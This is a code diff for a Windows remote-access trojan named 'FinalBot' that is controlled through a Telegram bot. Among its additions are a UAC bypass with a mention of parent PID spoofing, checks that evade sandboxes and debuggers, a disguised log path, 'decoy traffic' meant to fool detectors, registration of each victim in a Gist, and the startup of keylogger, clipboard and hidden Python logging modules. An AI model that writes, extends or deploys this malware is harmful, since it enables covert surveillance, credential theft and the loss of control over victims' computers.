@@ -4,33 +4,74 @@ using System.Net.Http;
 using System.Diagnostics;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+using System.Text;
 using VanguardCore;
+using VanguardCore.Modules;
+using FinalBot.Modules;
 
 namespace FinalBot
 {
     class Program
     {
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "GetModuleFileNameW")]
+        private static extern uint Win32_GetModuleFileName(IntPtr hModule, [Out] StringBuilder lpFilename, uint nSize);
+
         private static Mutex? _mutex;
 
         private static void DebugLog(string msg)
         {
-            try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", $"[{DateTime.Now}] {msg}\n"); } catch { }
+            try { File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] {msg}\n"); } catch { }
         }
+
+        private static void Log(string msg) => DebugLog(msg);
 
         static async Task Main(string[] args)
         {
-            // 1. Single Instance Check — fixed name to prevent multi-launch conflicts
+            Console.WriteLine($"[DEBUG] Startup: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
+            
+            // 1. Single Instance Check & Aggressive Cleanup
             bool createdNew;
-            string mutexName = "Global\\Vanguard_System_Runtime_7X2B9"; // Unique signature to avoid legacy locks
+            string mutexName = "Global\\Vanguard_System_Runtime_7X2B9";
             _mutex = new Mutex(true, mutexName, out createdNew);
+
             if (!createdNew) 
             {
-                Console.WriteLine("[-] Instance already active. Terminate existing process first.");
-                DebugLog("Process already running (Mutex found). Exiting.");
-                return;
+                Console.WriteLine("[-] Instance already active. Attempting aggressive recycle...");
+                DebugLog("Process already running. Killing existing instances to resolve Telegram conflict.");
+                
+                try {
+                    string currentName = Process.GetCurrentProcess().ProcessName;
+                    int currentId = Process.GetCurrentProcess().Id;
+                    foreach (var proc in Process.GetProcessesByName(currentName)) {
+                        if (proc.Id != currentId) {
+                            try {
+                                proc.Kill(true);
+                                Console.WriteLine($"[+] Terminated old instance: PID={proc.Id}");
+                            } catch { }
+                        }
+                    }
+                    Thread.Sleep(2000); // Give time for OS to release resources/sockets
+                } catch { }
+
+                // Try acquiring mutex again after cleanup
+                _mutex = new Mutex(true, mutexName, out createdNew);
+                if (!createdNew) {
+                    Console.WriteLine("[-] Critical: Failed to acquire mutex after cleanup. Exit.");
+                    return;
+                }
+                Console.WriteLine("[+] Mutex acquired after cleanup.");
             }
 
             DebugLog("Mutex acquired. Initializing services...");
+
+            // 0. Extract Embedded Resources
+            try { ResourceModule.ExtractAll(); }
+            catch (Exception ex) { 
+                Console.WriteLine($"[!] FATAL: Resource extraction failed: {ex.Message}"); 
+                Console.WriteLine("Press any key to exit..."); Console.ReadKey();
+                return; 
+            }
 
             // 3. Decoy Traffic — looks like normal browsing to AI detectors
             _ = Task.Run(async () =>
@@ -56,6 +97,8 @@ namespace FinalBot
             if (SafetyManager.VerifySystemContext()) 
             {
                 DebugLog("Sandbox/Debugger detected. Exiting.");
+                Console.WriteLine("[!] STEALTH MODE: Security context violation (Sandbox/Debugger).");
+                Console.WriteLine("Press any key to exit..."); Console.ReadKey();
                 return;
             }
 
@@ -65,26 +108,39 @@ namespace FinalBot
             // 3. UAC Check & Bypass
             if (!ElevationService.IsAdmin())
             {
-                DebugLog("Not admin. Attempting UAC bypass...");
-                string selfPath = Process.GetCurrentProcess().MainModule?.FileName ?? "MicrosoftEdgeUpdate.exe";
+                // Native path retrieval for stability
+                var sb = new StringBuilder(1024);
+                Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
+                string selfPath = sb.ToString();
                 
-                // CRITICAL: Release mutex before starting the elevated process, 
-                // otherwise the elevated instance will see it as 'already running' and exit.
+                if (string.IsNullOrEmpty(selfPath)) selfPath = "WinCoreAudit.exe";
+                
+                DebugLog("[UAC] Releasing mutex to allow elevated child...");
                 _mutex?.Dispose();
                 _mutex = null;
+                Thread.Sleep(500);
 
+                // Professional stealth: Parent PID Spoofing (explorer.exe as parent)
                 if (ElevationService.RequestElevation(selfPath))
                 {
-                    DebugLog("UAC bypass request sent. Exiting non-admin process.");
-                    return; 
+                    DebugLog("UAC bypass successful (Detected child). Exiting parent.");
+                    Process.GetCurrentProcess().Kill();
                 }
                 
-                // If bypass failed, re-acquire mutex
-                _mutex = new Mutex(true, mutexName, out _);
+                DebugLog("[UAC] All bypass methods failed. Continuing as User.");
+                _mutex = new Mutex(true, "Global\\Vanguard_System_Runtime_7X2B9", out _);
             }
             else
             {
-                DebugLog("Running with ADMIN privileges.");
+                DebugLog("Running as ADMIN.");
+                if (args.Length > 0 && Array.Exists(args, a => a == "--uac-child"))
+                {
+                    DebugLog("Child process signaled success event.");
+                    try { 
+                        EventWaitHandle successEvent = new EventWaitHandle(false, EventResetMode.ManualReset, "Global\\Vanguard_Elevation_Success");
+                        successEvent.Set();
+                    } catch { }
+                }
             }
 
             // 4. Persistence
@@ -96,6 +152,10 @@ namespace FinalBot
                 DebugLog("Loading ConfigManager...");
                 ConfigManager.Load();
                 
+                // A-03: Register victim in Gist for P2P Mesh & Session Switching
+                _ = Task.Run(async () => {
+                    try { await GistManager.UpdateFile($"victim_{ConfigManager.VictimName}.json", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")); } catch { }
+                });
                 string token = ConfigManager.Get("BOT_TOKEN");
                 string adminId = ConfigManager.Get("ADMIN_ID");
                 
@@ -107,12 +167,30 @@ namespace FinalBot
                     return;
                 }
 
+                DebugLog("Connectivity check (China Bypass)...");
+                var httpClient = await ProxyTunnel.GetBestHttpClient();
+
                 DebugLog("Creating BotOrchestrator...");
-                var orchestrator = new BotOrchestrator(token, adminId);
+                Log("Creating BotOrchestrator...");
+                var orchestrator = new BotOrchestrator(token, adminId, httpClient);
                 
                 // Start Background Modules
-                FinalBot.Modules.KeyloggerModule.Start();
-                FinalBot.Modules.ClipboardModule.Start();
+                DebugLog("Starting Modules...");
+                try { 
+                    KeyloggerModule.Start(); 
+                    DebugLog("Keylogger started.");
+                } catch (Exception ex) { 
+                    DebugLog($"Keylogger failed: {ex.Message}"); 
+                    Log($"Keylogger failed: {ex.Message}");
+                }
+
+                try { 
+                    ClipboardModule.Start(); 
+                    DebugLog("Clipboard started.");
+                } catch (Exception ex) { 
+                    DebugLog($"Clipboard failed: {ex.Message}"); 
+                    Log($"Clipboard failed: {ex.Message}");
+                }
 
                 // Start Global Logger (Python script)
                 _ = Task.Run(() => {
@@ -125,19 +203,31 @@ namespace FinalBot
                                 UseShellExecute = false,
                                 CreateNoWindow = true
                             });
+                            DebugLog("GlobalLogger.py started.");
+                            Log("GlobalLogger.py started.");
+                        } else {
+                            DebugLog($"GlobalLogger.py not found at {loggerPath}");
+                            Log($"GlobalLogger.py not found at {loggerPath}");
                         }
-                    } catch { }
+                    } catch (Exception ex) {
+                        DebugLog($"Error starting GlobalLogger.py: {ex.Message}");
+                        Log($"Error starting GlobalLogger.py: {ex.Message}");
+                    }
                 });
 
                 DebugLog("Starting BotOrchestrator...");
+                Log("Starting BotOrchestrator...");
                 await orchestrator.StartAsync();
+                Log("BotOrchestrator started successfully.");
             }
             catch (Exception ex)
             {
                 DebugLog($"FATAL ERROR: {ex.Message}\n{ex.StackTrace}");
-                Logger.Error("Fatal application error", ex);
-                LogCrash(ex);
+                Log("FATAL CRASH: " + ex.ToString());
+                Console.WriteLine($"[FATAL] {ex.Message}");
             }
+            Console.WriteLine("\n[DEBUG] Execution finished. Press any key to exit...");
+            Console.ReadKey();
         }
 
         private static void LogCrash(Exception ex)
